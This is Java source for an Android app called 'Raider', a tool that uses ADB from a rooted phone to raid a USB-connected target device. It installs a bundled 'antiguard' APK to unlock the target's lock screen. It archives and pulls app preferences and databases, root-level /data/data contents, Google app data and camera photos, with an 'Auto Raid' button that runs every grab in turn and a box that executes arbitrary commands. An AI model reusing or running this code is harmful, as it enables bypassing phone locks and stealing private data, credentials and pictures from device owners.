package com.silentservices.raider;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;

import android.app.Activity;
import android.app.AlertDialog;
import android.app.ProgressDialog;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.PackageManager.NameNotFoundException;
import android.hardware.usb.UsbDevice;
import android.hardware.usb.UsbManager;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.Environment;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ImageView;
import android.widget.ProgressBar;

public class RaiderActivity extends Activity {

	Boolean bADBRunning = false;

	EditText etInput;
	EditText etCommand;
	Button btnStartADB;

	Button btnCheckDevices;

	Button btnEnter;

	Button btnGetData;
	Button btnGetDataRoot;
	Button btnGetGoogleData;
	Button btnGetPics;
	Button btnADBRoot;
	Button btnAutoRaid;
	Button btnClearOutput;
	Button btnListPackages;
	Button btnUnlockTarget;
	ImageView ivADBEnabled;
	ProgressBar pbProgress;
	Process mainprocess;
	BufferedReader mainstdInput;
	BufferedReader mainstdError;
	ProgressDialog progressDialog;
	UsbDevice uDevice;
	UsbManager uManager;
	BroadcastReceiver mUsbReceiver;

	/** Called when the activity is first created. */
	@Override
	public void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		// requestWindowFeature(Window.FEATURE_INDETERMINATE_PROGRESS);
		// requestWindowFeature(Window.FEATURE_PROGRESS);
		setContentView(R.layout.main);
		btnStartADB = (Button) findViewById(R.id.button1);
		btnStartADB.setOnClickListener(btnStartADBpressed);
		btnCheckDevices = (Button) findViewById(R.id.button2);
		btnCheckDevices.setOnClickListener(btnCheckDevicespressed);
		btnEnter = (Button) findViewById(R.id.button3);
		btnEnter.setOnClickListener(btnEnterpressed);

		btnGetData = (Button) findViewById(R.id.button4);
		btnGetData.setOnClickListener(btnGetDatapressed);
		btnGetDataRoot = (Button) findViewById(R.id.button5);
		btnGetDataRoot.setOnClickListener(btnGetDataRootpressed);
		btnGetGoogleData = (Button) findViewById(R.id.button6);
		btnGetGoogleData.setOnClickListener(btnGetGoogleDatapressed);
		btnGetPics = (Button) findViewById(R.id.button7);
		btnGetPics.setOnClickListener(btnGetPicspressed);
		btnADBRoot = (Button) findViewById(R.id.button8);
		btnADBRoot.setOnClickListener(btnADBRootpressed);
		btnAutoRaid = (Button) findViewById(R.id.button9);
		btnAutoRaid.setOnClickListener(btnAutoRaidpressed);
		btnClearOutput = (Button) findViewById(R.id.button10);
		btnClearOutput.setOnClickListener(btnClearOutputpressed);
		btnListPackages = (Button) findViewById(R.id.btnListPackages);
		btnListPackages.setOnClickListener(btnListPackagespressed);
		btnUnlockTarget = (Button) findViewById(R.id.btnUnlockTarget);
		btnUnlockTarget.setOnClickListener(btnUnlockTargetpressed);
		etInput = (EditText) findViewById(R.id.editText1);
		etCommand = (EditText) findViewById(R.id.editText2);
		ivADBEnabled = (ImageView) findViewById(R.id.imageView1);

		// setProgressBarIndeterminateVisibility(false);
		// setProgressBarVisibility(false);
		doCheckIfAdbIsAvailable();
		doExtractAntiguard("antiguard.apk");
		doRegisterReceivers();
		doInitializeShellProcess();
		new doStartADB().execute();
		doCheckIfADBIsRunning();
		doReadUsbDeviceDetails();

	}

	@Override
	protected void onDestroy() {
		super.onDestroy();
		if (mUsbReceiver != null) {
			unregisterReceiver(mUsbReceiver);
		}
	}

	@Override
	protected void onResume() {
		super.onResume();
		if (mUsbReceiver == null) {
			doRegisterReceivers();
		}
	}

	@Override
	protected void onPause() {
		super.onPause();
		if (mUsbReceiver != null) {
			unregisterReceiver(mUsbReceiver);
			mUsbReceiver = null;
		}
	}

	public void doRegisterReceivers() {

		IntentFilter filter = new IntentFilter();

		filter.addAction(UsbManager.ACTION_USB_DEVICE_ATTACHED);
		// filter.addAction(UsbManager.ACTION_USB_DEVICE_DETACHED);

		// BroadcastReceiver when device added or removed
		mUsbReceiver = new BroadcastReceiver() {
			@Override
			public void onReceive(Context context, Intent intent) {
				String action = intent.getAction();
				if (UsbManager.ACTION_USB_DEVICE_ATTACHED.equals(action)) {
					doReadUsbDeviceDetails();
				}
			}
		};
		registerReceiver(mUsbReceiver, filter);
	}

	private void doCheckIfAdbIsAvailable() {
		File file = new File("/system/bin/", "adb");

		if (!file.exists()) {
			file = new File("/system/xbin/", "adb");
			if (!file.exists()) {

				doShowResultAlertBox(
						"Sorry",
						"ADB could not be found. Make sure it's available in /system/bin or /system/xbin. I will quit now.");

			}
		}
	}

	private void doReadUsbDeviceDetails() {

		uManager = (UsbManager) getSystemService(USB_SERVICE);
		uDevice = (UsbDevice) getIntent().getParcelableExtra(
				UsbManager.EXTRA_DEVICE);
		if (uDevice != null) {
			etInput.append("Model: " + uDevice.getDeviceName().toString());
			etInput.append("ID: " + String.valueOf(uDevice.getDeviceId()));
			etInput.append("Class: " + String.valueOf(uDevice.getDeviceClass()));
			etInput.append("Subclass: "
					+ String.valueOf(uDevice.getDeviceSubclass()));
			etInput.append("Protocol: "
					+ String.valueOf(uDevice.getDeviceProtocol()));
			etInput.append("Vendor: " + String.valueOf(uDevice.getVendorId()));
			etInput.append("Product: " + String.valueOf(uDevice.getProductId()));

		}

	}

	private void doInitializeShellProcess() {

		try {
			mainprocess = Runtime.getRuntime().exec("su");
			mainstdInput = new BufferedReader(new InputStreamReader(
					mainprocess.getInputStream()));
			mainstdError = new BufferedReader(new InputStreamReader(
					mainprocess.getErrorStream()));

		} catch (IOException e) {

			etInput.append("exception happened - here's what I know: ");

			etInput.append(e.toString());

		}
		;

	}

	public void doExtractAntiguard(String fileName) {
		if (!new File(fileName).exists()) {

			try {
				InputStream localInputStream = getAssets().open(fileName);
				FileOutputStream localFileOutputStream = getBaseContext()
						.openFileOutput(fileName, MODE_PRIVATE);

				byte[] arrayOfByte = new byte[1024];
				int offset;
				while ((offset = localInputStream.read(arrayOfByte)) > 0) {
					localFileOutputStream.write(arrayOfByte, 0, offset);
				}
				localFileOutputStream.close();
				localInputStream.close();

				etInput.append("Info: antiguard extracted successfully. You can unlock a target now.\r\n");
			} catch (IOException localIOException) {
				localIOException.printStackTrace();
				return;
			}
		} else
			etInput.append("Info: antiguard already extracted.\r\n");
	}

	public void doUnlockTarget() {
		PackageManager m = getPackageManager();
		String s = getPackageName();
		try {
			PackageInfo p = m.getPackageInfo(s, 0);
			s = p.applicationInfo.dataDir;
			try {

				doInitializeShellProcess();
				StringBuilder sb = new StringBuilder();
				DataOutputStream os = new DataOutputStream(
						mainprocess.getOutputStream());
				os.writeBytes("adb install " + s + "/files/antiguard.apk\n");
				os.writeBytes("adb shell am start io.kos.antiguard/.unlock\n");
				os.writeBytes("exit\n");
				os.flush();

				while ((s = mainstdInput.readLine()) != null) {

					sb.append(s + "\r\n");

					try {

						etInput.append(sb);

					} catch (Exception ex) {
						progressDialog.dismiss();
					}
				}
				progressDialog.dismiss();

				// read any errors from the attempted command

				while ((s = mainstdError.readLine()) != null) {

					etInput.append(s.toString());
					etInput.append("\r\n");
				}

			} catch (IOException e) {

				etInput.append("exception happened - here's what I know: ");

				etInput.append(e.toString());

			}
			;

		} catch (NameNotFoundException e) {
			etInput.append("Info: Package name not found.\r\n");
		}

	}

	public void doWaitForDevice() {

		String s = null;
		try {

			/* start adb as root */

			doInitializeShellProcess();
			StringBuilder sb = new StringBuilder();
			DataOutputStream os = new DataOutputStream(
					mainprocess.getOutputStream());
			os.writeBytes("adb wait-for-device\n");
			os.writeBytes("exit\n");
			os.flush();

			while ((s = mainstdInput.readLine()) != null) {

				sb.append(s + "\r\n");

				try {

					etInput.append(sb);

				} catch (Exception ex) {
					progressDialog.dismiss();
				}
			}
			progressDialog.dismiss();

			// read any errors from the attempted command

			while ((s = mainstdError.readLine()) != null) {

				etInput.append(s.toString());
				etInput.append("\r\n");
			}

		} catch (IOException e) {

			etInput.append("exception happened - here's what I know: ");

			etInput.append(e.toString());

		}
		;

	}

	public boolean doCheckDirs(String dir) {

		String s = null;
		try {

			/* Check if dirs exist */
			progressDialog = ProgressDialog.show(RaiderActivity.this,
					"Checking directories", " Please wait ... ", true);
			Process p = Runtime.getRuntime().exec("su");
			BufferedReader stdInput = new BufferedReader(new InputStreamReader(
					p.getInputStream()));
			BufferedReader stdError = new BufferedReader(new InputStreamReader(
					p.getErrorStream()));
			StringBuilder sb = new StringBuilder();
			DataOutputStream os = new DataOutputStream(p.getOutputStream());
			os.writeBytes("adb shell \"[[ -d " + dir + " ]] && echo 1\"\n");
			os.writeBytes("exit\n");
			os.flush();

			while ((s = stdInput.readLine()) != null) {

				if (s.contentEquals("1")) {
					progressDialog.dismiss();
					sb.append(s + "\r\n" + dir + " is present\r\n");
					return true;

				} else {
					progressDialog.dismiss();
					sb.append(s + "\r\n" + dir + " is NOT present\r\n");
				}

				try {

					etInput.append(sb);

				} catch (Exception ex) {

				}
			}

			// read any errors from the attempted command

			while ((s = stdError.readLine()) != null) {

				etInput.append(s.toString());
				etInput.append("\r\n");
			}

		} catch (IOException e) {

			etInput.append("exception happened - here's what I know: ");

			etInput.append(e.toString());

		}
		;

		return false;

	}

	// public void doGetData() {
	// String s = null;
	// String dir = "/sdcard/Android/data";
	//
	// if (doCheckDirs(dir)) {
	//
	// doCheckIfADBIsRunning();
	// if (bADBRunning) {
	//
	// try {
	//
	// /* run the Unix "adb devices" command */
	// progressDialog = ProgressDialog.show(RaiderActivity.this,
	// "Raiding data", " Please wait ... ", true);
	// String outdir = Environment.getExternalStorageDirectory()
	// .toString();
	//
	// doInitializeShellProcess();
	// StringBuilder sb = new StringBuilder();
	// DataOutputStream os = new DataOutputStream(
	// mainprocess.getOutputStream());
	//
	// os.writeBytes("adb shell \"tar -cf "
	// + outdir
	// +
	// "/raider-data.tar /sdcard/Android/data/*/shared_prefs /sdcard/Android/data/*/databases\" && cd "
	// + outdir
	// + " && adb pull /mnt/sdcard/raider-data.tar\n");
	//
	// os.writeBytes("exit\n");
	// os.flush();
	//
	// while ((s = mainstdInput.readLine()) != null) {
	//
	// s = s + "\n";
	// etInput.append(s);
	// s = "";
	//
	// }
	//
	// while ((s = mainstdError.readLine()) != null) {
	// s = s + "\n";
	// etInput.append(s);
	// s = "";
	//
	// }
	//
	// } catch (IOException e) {
	// progressDialog.dismiss();
	// etInput.append("exception happened - here's what I know: ");
	// etInput.append(e.toString());
	// }
	// ;
	// } else {
	// progressDialog.dismiss();
	// etInput.append("ADB not running. Please start it first \r\n");
	// }
	// progressDialog.dismiss();
	// } else {
	// progressDialog.dismiss();
	// etInput.append("/sdcard/Android/data/ not present \r\n");
	// }
	//
	// }

	// public void doGetDataRoot() {
	// String s = null;
	// String dir = "/data/data";
	//
	// if (doCheckDirs(dir)) {
	//
	// try {
	//
	// /* run the Unix "adb devices" command */
	// progressDialog = ProgressDialog.show(RaiderActivity.this,
	// "Raiding data as root", " Please wait ... ", true);
	// String outdir = Environment.getExternalStorageDirectory()
	// .toString();
	//
	// doInitializeShellProcess();
	// StringBuilder sb = new StringBuilder();
	// DataOutputStream os = new DataOutputStream(
	// mainprocess.getOutputStream());
	// os.writeBytes("adb shell \"tar -cf "
	// + outdir
	// +
	// "/raider-data-root.tar /data/data/*/shared_prefs /data/data/*/databases\" && cd "
	// + outdir
	// + " && adb pull /mnt/sdcard/raider-data-root.tar\n");
	// os.writeBytes("exit\n");
	// os.flush();
	//
	// while ((s = mainstdInput.readLine()) != null) {
	//
	// s = s + "\n";
	// etInput.append(s);
	// s = "";
	//
	// }
	//
	// while ((s = mainstdError.readLine()) != null) {
	// s = s + "\n";
	// etInput.append(s);
	// s = "";
	//
	// }
	//
	// } catch (IOException e) {
	// progressDialog.dismiss();
	// etInput.append("exception happened - here's what I know: ");
	// etInput.append(e.toString());
	// }
	// ;
	// } else {
	// progressDialog.dismiss();
	// etInput.append("/data/data/ not present \r\n");
	// }
	// progressDialog.dismiss();
	// }

	// public void doGetGoogleData() {
	//
	// String dir = "/data/data";
	// String s = null;
	// if (doCheckDirs(dir)) {
	//
	// try {
	// progressDialog = ProgressDialog.show(RaiderActivity.this,
	// "Raiding google data", " Please wait ... ", true);
	// etInput.append("Trying to grab data. Please wait patiently...\n");
	// /* run the Unix "adb devices" command */
	//
	// String outdir = Environment.getExternalStorageDirectory()
	// .toString();
	//
	// doInitializeShellProcess();
	// StringBuilder sb = new StringBuilder();
	// DataOutputStream os = new DataOutputStream(
	// mainprocess.getOutputStream());
	// os.writeBytes("adb shell \"tar -c /data/data/com.google.* >   "
	// + outdir + "/raider-googledata.tar\" && cd " + outdir
	// + " && adb pull /mnt/sdcard/raider-googledata.tar\n");
	// os.writeBytes("exit\n");
	// os.flush();
	//
	// while ((s = mainstdInput.readLine()) != null) {
	//
	// s = s + "\n";
	// etInput.append(s);
	// s = "";
	//
	// }
	//
	// while ((s = mainstdError.readLine()) != null) {
	// s = s + "\n";
	// etInput.append(s);
	// s = "";
	//
	// }
	//
	// } catch (IOException e) {
	// progressDialog.dismiss();
	// etInput.append("exception happened - here's what I know: ");
	// etInput.append(e.toString());
	// }
	// ;
	//
	// } else {
	// progressDialog.dismiss();
	// etInput.append("/data/data/ not present \r\n");
	// }
	// progressDialog.dismiss();
	// }

	// public void doGetPics() {
	// String s = null;
	// String dir = "/mnt/sdcard/DCIM/Camera";
	//
	// if (doCheckDirs(dir)) {
	//
	// try {
	//
	// /* run the Unix "adb devices" command */
	// progressDialog = ProgressDialog.show(RaiderActivity.this,
	// "Raiding pictures", " Please wait ... ", true);
	// String outdir = Environment.getExternalStorageDirectory()
	// .toString();
	//
	// doInitializeShellProcess();
	// StringBuilder sb = new StringBuilder();
	// DataOutputStream os = new DataOutputStream(
	// mainprocess.getOutputStream());
	// os.writeBytes("adb shell \"tar -c /mnt/sdcard/DCIM/Camera >   "
	// + outdir + "/raider-pics.tar\" && cd " + outdir
	// + " && adb pull /mnt/sdcard/raider-pics.tar\n");
	// os.writeBytes("exit\n");
	// os.flush();
	//
	// while ((s = mainstdInput.readLine()) != null) {
	//
	// s = s + "\n";
	// etInput.append(s);
	// s = "";
	//
	// }
	//
	// while ((s = mainstdError.readLine()) != null) {
	// s = s + "\n";
	// etInput.append(s);
	// s = "";
	//
	// }
	//
	// } catch (IOException e) {
	// progressDialog.dismiss();
	// etInput.append("exception happened - here's what I know: ");
	// etInput.append(e.toString());
	// }
	// ;
	// } else {
	// progressDialog.dismiss();
	// etInput.append("/mnt/sdcard/DCIM/Camera not present \r\n");
	// }
	// progressDialog.dismiss();
	// }

	public void doGetPackages() {

		String s = null;
		try {

			/* run the Unix "adb shell pm list packages" command */
			progressDialog = ProgressDialog.show(RaiderActivity.this,
					"Reading installed packages", " Please wait ... ", true);

			doInitializeShellProcess();

			DataOutputStream os = new DataOutputStream(
					mainprocess.getOutputStream());
			os.writeBytes("adb shell pm list packages\n");
			os.writeBytes("exit\n");
			os.flush();

			while ((s = mainstdInput.readLine()) != null) {

				s = s + "\n";
				try {
					etInput.append(s);
				} catch (Exception ex) {
					progressDialog.dismiss();
				}
			}

			while ((s = mainstdError.readLine()) != null) {
				progressDialog.dismiss();
				etInput.append(s.toString());
				etInput.append("\r\n");
			}

		} catch (IOException e) {
			progressDialog.dismiss();
			etInput.append("exception happened - here's what I know: ");
			etInput.append(e.toString());
		}
		;

		progressDialog.dismiss();
	}

	public void doCheckIfADBIsRunning() {

		String s = null;
		try {

			/* run the Unix "adb devices" command */

			doInitializeShellProcess();

			DataOutputStream os = new DataOutputStream(
					mainprocess.getOutputStream());
			os.writeBytes("ps | grep \" adb\"\n");
			os.writeBytes("exit\n");
			os.flush();

			if ((s = mainstdInput.readLine()) != null) {

				bADBRunning = true;
				ivADBEnabled.setImageResource(R.drawable.green);

			} else {
				bADBRunning = false;
				ivADBEnabled.setImageResource(R.drawable.red);
			}

			while ((s = mainstdError.readLine()) != null) {
				etInput.append(s.toString());
				etInput.append("\r\n");
			}

		} catch (IOException e) {
			etInput.append("exception happened - here's what I know: ");
			etInput.append(e.toString());
		}
		;

	}

	protected void doShowResultAlertBox(String title, String mymessage) {

		new AlertDialog.Builder(this)

				.setMessage(mymessage)
				.setTitle(title)
				.setCancelable(true)
				.setPositiveButton(android.R.string.ok,
						new DialogInterface.OnClickListener() {
							@Override
							public void onClick(DialogInterface dialog,
									int whichButton) {
								RaiderActivity.this.finish();
							}
						}).show();
	}

	private final View.OnClickListener btnStartADBpressed = new View.OnClickListener() {
		@Override
		public void onClick(View v) {

			new doStartADB().execute();
		}
	};

	private final View.OnClickListener btnCheckDevicespressed = new View.OnClickListener() {
		@Override
		public void onClick(View v) {
			String s = null;
			try {

				/* run the Unix "adb devices" command */

				doInitializeShellProcess();

				DataOutputStream os = new DataOutputStream(
						mainprocess.getOutputStream());
				os.writeBytes("adb devices\n");
				os.writeBytes("exit\n");
				os.flush();

				while ((s = mainstdInput.readLine()) != null) {

					s = s + "\n";
					try {
						etInput.append(s);
					} catch (Exception ex) {

					}
				}

				while ((s = mainstdError.readLine()) != null) {
					etInput.append(s.toString());
					etInput.append("\r\n");
				}

			} catch (IOException e) {
				etInput.append("exception happened - here's what I know: ");
				etInput.append(e.toString());
			}
			;

		}
	};

	private final View.OnClickListener btnEnterpressed = new View.OnClickListener() {
		@Override
		public void onClick(View v) {

			String s = null;
			try {

				/* run the Unix "adb devices" command */
				String strCommand = etCommand.getText().toString();
				Process p = Runtime.getRuntime().exec(strCommand);

				BufferedReader stdInput = new BufferedReader(
						new InputStreamReader(p.getInputStream()));

				BufferedReader stdError = new BufferedReader(
						new InputStreamReader(p.getErrorStream()));

				StringBuilder sb = new StringBuilder();

				while ((s = stdInput.readLine()) != null) {

					sb.append(s + "\r\n");

					try {

						etInput.append(sb);

					} catch (Exception ex) {

					}
				}

				// read any errors from the attempted command

				while ((s = stdError.readLine()) != null) {

					etInput.append(s.toString());
					etInput.append("\r\n");
				}

			} catch (IOException e) {

				etInput.append("exception happened - here's what I know: ");

				etInput.append(e.toString());

			}
			;
		}
	};

	private final View.OnClickListener btnGetDatapressed = new View.OnClickListener() {
		@Override
		public void onClick(View v) {
			// doGetData();
			new doGetData().execute();
		}
	};

	private final View.OnClickListener btnGetDataRootpressed = new View.OnClickListener() {
		@Override
		public void onClick(View v) {
			// doGetDataRoot();
			new doGetDataRoot().execute();
		}
	};

	private final View.OnClickListener btnGetGoogleDatapressed = new View.OnClickListener() {
		@Override
		public void onClick(View v) {
			// doGetGoogleData();
			new doGetGoogleData().execute();
		}
	};

	private final View.OnClickListener btnGetPicspressed = new View.OnClickListener() {
		@Override
		public void onClick(View v) {
			// doGetPics();
			new doGetPics().execute();
		}
	};

	private final View.OnClickListener btnADBRootpressed = new View.OnClickListener() {
		@Override
		public void onClick(View v) {
			String s = null;
			try {
				/* run the Unix "adb devices" command */
				Process p = Runtime.getRuntime().exec("adb root");
				BufferedReader stdInput = new BufferedReader(
						new InputStreamReader(p.getInputStream()));
				BufferedReader stdError = new BufferedReader(
						new InputStreamReader(p.getErrorStream()));
				StringBuilder sb = new StringBuilder();
				while ((s = stdInput.readLine()) != null) {
					sb.append(s + "\r\n");

					try {
						etInput.append(sb);
					} catch (Exception ex) {

					}
				}

				while ((s = stdError.readLine()) != null) {
					etInput.append(s.toString());
					etInput.append("\r\n");
				}

			} catch (IOException e) {
				etInput.append("exception happened - here's what I know: ");
				etInput.append(e.toString());
			}
			;

		}
	};

	private final View.OnClickListener btnAutoRaidpressed = new View.OnClickListener() {

		@Override
		public void onClick(View v) {

			etInput.append("Raiding target...");
			etInput.append("\r\n");

			doWaitForDevice();
			// doGetData();
			// doGetDataRoot();
			// doGetGoogleData();
			// doGetPics();

			new doGetData().execute();
			new doGetDataRoot().execute();
			new doGetGoogleData().execute();
			new doGetPics().execute();

		}

	};

	private final View.OnClickListener btnClearOutputpressed = new View.OnClickListener() {

		@Override
		public void onClick(View v) {

			etInput.setText("");

		}

	};

	private final View.OnClickListener btnListPackagespressed = new View.OnClickListener() {
		@Override
		public void onClick(View v) {

			doGetPackages();
		}

	};

	private final View.OnClickListener btnUnlockTargetpressed = new View.OnClickListener() {
		@Override
		public void onClick(View v) {

			doUnlockTarget();
		}

	};

	private class doStartADB extends AsyncTask<Void, Void, String> {

		StringBuilder sb = new StringBuilder();

		@Override
		protected void onPreExecute() {
			progressDialog = ProgressDialog.show(RaiderActivity.this,
					"Starting ADB", " Please wait ... ", true);
			super.onPreExecute();
		}

		@Override
		protected String doInBackground(Void... param) {

			String s = null;

			try {

				/* start adb as root */

				doInitializeShellProcess();
				// StringBuilder sb = new StringBuilder();
				DataOutputStream os = new DataOutputStream(
						mainprocess.getOutputStream());
				os.writeBytes("adb kill-server && adb start-server\n");
				os.writeBytes("exit\n");
				os.flush();

				while ((s = mainstdInput.readLine()) != null) {

					sb.append(s + "\r\n");

				}
				// progressDialog.dismiss();

				// read any errors from the attempted command

				while ((s = mainstdError.readLine()) != null) {
					sb.append(s + "\r\n");
				}

			} catch (IOException e) {
				// progressDialog.dismiss();
				sb.append("exception happened - here's what I know: ");

				sb.append(e.toString());

			}
			;
			return sb.toString();
		}

		@Override
		protected void onPostExecute(String result) {
			progressDialog.dismiss();
			etInput.append(result);
			super.onPostExecute(result);
		}
	}

	private class doGetData extends AsyncTask<Void, Void, String> {

		StringBuilder sb = new StringBuilder();

		@Override
		protected void onPreExecute() {
			progressDialog = ProgressDialog.show(RaiderActivity.this,
					"Raiding data", " Please wait ... ", true);
			super.onPreExecute();
		}

		@Override
		protected String doInBackground(Void... param) {

			String s = null;
			String dir = "/sdcard/Android/data";

			if (doCheckDirs(dir)) {

				doCheckIfADBIsRunning();
				if (bADBRunning) {

					try {

						/* run the Unix "adb devices" command */

						String outdir = Environment
								.getExternalStorageDirectory().toString();

						doInitializeShellProcess();

						DataOutputStream os = new DataOutputStream(
								mainprocess.getOutputStream());

						os.writeBytes("adb shell \"tar -cf "
								+ outdir
								+ "/raider-data.tar /sdcard/Android/data/*/shared_prefs /sdcard/Android/data/*/databases\" && cd "
								+ outdir
								+ " && adb pull /mnt/sdcard/raider-data.tar\n");

						os.writeBytes("exit\n");
						os.flush();

						while ((s = mainstdInput.readLine()) != null) {

							sb.append(s + "\r\n");

						}

						while ((s = mainstdError.readLine()) != null) {
							sb.append(s + "\r\n");

						}

					} catch (IOException e) {
						progressDialog.dismiss();
						sb.append("exception happened - here's what I know: ");
						sb.append(e.toString());
					}
					;
				} else {

					sb.append("ADB not running. Please start it first \r\n");
				}

			} else {

				sb.append("/sdcard/Android/data/ not present \r\n");
			}

			return sb.toString();
		}

		@Override
		protected void onPostExecute(String result) {
			progressDialog.dismiss();
			etInput.append(result);
			super.onPostExecute(result);
		}

	}

	private class doGetDataRoot extends AsyncTask<Void, Void, String> {

		StringBuilder sb = new StringBuilder();

		@Override
		protected void onPreExecute() {
			progressDialog = ProgressDialog.show(RaiderActivity.this,
					"Raiding data as root", " Please wait ... ", true);
			super.onPreExecute();
		}

		@Override
		protected String doInBackground(Void... param) {

			String s = null;
			String dir = "/data/data";

			if (doCheckDirs(dir)) {

				doCheckIfADBIsRunning();
				if (bADBRunning) {

					try {

						/* run the Unix "adb devices" command */

						String outdir = Environment
								.getExternalStorageDirectory().toString();

						doInitializeShellProcess();

						DataOutputStream os = new DataOutputStream(
								mainprocess.getOutputStream());

						os.writeBytes("adb shell \"tar -cf "
								+ outdir
								+ "/raider-data-root.tar /data/data/*/shared_prefs /data/data/*/databases\" && cd "
								+ outdir
								+ " && adb pull /mnt/sdcard/raider-data-root.tar\n");

						os.writeBytes("exit\n");
						os.flush();

						while ((s = mainstdInput.readLine()) != null) {

							sb.append(s + "\r\n");

						}

						while ((s = mainstdError.readLine()) != null) {
							sb.append(s + "\r\n");

						}

					} catch (IOException e) {
						progressDialog.dismiss();
						sb.append("exception happened - here's what I know: ");
						sb.append(e.toString());
					}
					;
				} else {

					sb.append("ADB not running. Please start it first \r\n");
				}

			} else {

				sb.append("/data/data/ not present \r\n");
			}

			return sb.toString();
		}

		@Override
		protected void onPostExecute(String result) {
			progressDialog.dismiss();
			etInput.append(result);
			super.onPostExecute(result);
		}

	}

	private class doGetGoogleData extends AsyncTask<Void, Void, String> {

		StringBuilder sb = new StringBuilder();

		@Override
		protected void onPreExecute() {
			progressDialog = ProgressDialog.show(RaiderActivity.this,
					"Raiding google data", " Please wait ... ", true);
			super.onPreExecute();
		}

		@Override
		protected String doInBackground(Void... param) {

			String s = null;
			String dir = "/data/data";

			if (doCheckDirs(dir)) {

				doCheckIfADBIsRunning();
				if (bADBRunning) {

					try {

						/* run the Unix "adb devices" command */

						String outdir = Environment
								.getExternalStorageDirectory().toString();

						doInitializeShellProcess();

						DataOutputStream os = new DataOutputStream(
								mainprocess.getOutputStream());

						os.writeBytes("adb shell \"tar -c /data/data/com.google.* >   "
								+ outdir
								+ "/raider-googledata.tar\" && cd "
								+ outdir
								+ " && adb pull /mnt/sdcard/raider-googledata.tar\n");

						os.writeBytes("exit\n");
						os.flush();

						while ((s = mainstdInput.readLine()) != null) {

							sb.append(s + "\r\n");

						}

						while ((s = mainstdError.readLine()) != null) {
							sb.append(s + "\r\n");

						}

					} catch (IOException e) {
						progressDialog.dismiss();
						sb.append("exception happened - here's what I know: ");
						sb.append(e.toString());
					}
					;
				} else {

					sb.append("ADB not running. Please start it first \r\n");
				}

			} else {

				sb.append("/data/data/ not present \r\n");
			}

			return sb.toString();
		}

		@Override
		protected void onPostExecute(String result) {
			progressDialog.dismiss();
			etInput.append(result);
			super.onPostExecute(result);
		}

	}

	private class doGetPics extends AsyncTask<Void, Void, String> {

		StringBuilder sb = new StringBuilder();

		@Override
		protected void onPreExecute() {
			progressDialog = ProgressDialog.show(RaiderActivity.this,
					"Raiding pictures", " Please wait ... ", true);
			super.onPreExecute();
		}

		@Override
		protected String doInBackground(Void... param) {

			String s = null;
			String dir = "/mnt/sdcard/DCIM/Camera";

			if (doCheckDirs(dir)) {

				doCheckIfADBIsRunning();
				if (bADBRunning) {

					try {

						/* run the Unix "adb devices" command */

						String outdir = Environment
								.getExternalStorageDirectory().toString();

						doInitializeShellProcess();

						DataOutputStream os = new DataOutputStream(
								mainprocess.getOutputStream());

						os.writeBytes("adb shell \"tar -c /mnt/sdcard/DCIM/Camera >   "
								+ outdir
								+ "/raider-pics.tar\" && cd "
								+ outdir
								+ " && adb pull /mnt/sdcard/raider-pics.tar\n");

						os.writeBytes("exit\n");
						os.flush();

						while ((s = mainstdInput.readLine()) != null) {

							sb.append(s + "\r\n");

						}

						while ((s = mainstdError.readLine()) != null) {
							sb.append(s + "\r\n");

						}

					} catch (IOException e) {
						progressDialog.dismiss();
						sb.append("exception happened - here's what I know: ");
						sb.append(e.toString());
					}
					;
				} else {

					sb.append("ADB not running. Please start it first \r\n");
				}

			} else {

				sb.append("/mnt/sdcard/DCIM/Camera not present \r\n");
			}

			return sb.toString();
		}

		@Override
		protected void onPostExecute(String result) {
			progressDialog.dismiss();
			etInput.append(result);
			super.onPostExecute(result);
		}

	}

}